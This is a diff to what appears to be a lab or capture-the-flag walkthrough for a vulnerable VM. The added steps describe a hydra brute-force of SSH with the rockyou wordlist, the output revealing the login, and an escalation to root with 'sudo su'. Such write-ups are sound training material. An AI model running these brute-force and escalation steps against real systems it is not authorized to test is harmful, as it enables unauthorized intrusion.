@@ -190,6 +190,10 @@ We got some mysql credentials from the file:
 ![image](https://github.com/keerthiprabup/VM/assets/116485904/1d69af55-92ee-42b0-8d70-a04bfc3483ed)
 
 
+Using hydra we could perform a bruteforce attack on the ssh server using the username that we got from the wordpress:togie
+
+Results:
+
 
         # hydra -l togie -P /usr/share/wordlists/rockyou.txt ssh://192.168.42.55/ -t 4
         Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -199,3 +203,17 @@ We got some mysql credentials from the file:
         [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
         [DATA] attacking ssh://192.168.42.55:22/
         [22][ssh] host: 192.168.42.55   login: togie   password: 1234
+
+
+As we got the username and the password, we could access the ssh server by logging into it:
+![image](https://github.com/keerthiprabup/VM/assets/116485904/5aa57962-26d1-4ec4-a2b1-f74c04edf299)
+
+The user is in the sudoers file so that the user can perform sudo command.
+
+Use the command $sudo su to switch to the root user:
+
+![image](https://github.com/keerthiprabup/VM/assets/116485904/1ab80933-988b-40d9-b1d4-c34cff68a60e)
+
+We have a file in the root directory:
+
+![image](https://github.com/keerthiprabup/VM/assets/116485904/f8a7f435-6035-4f3e-b8ca-3d22a0198938)
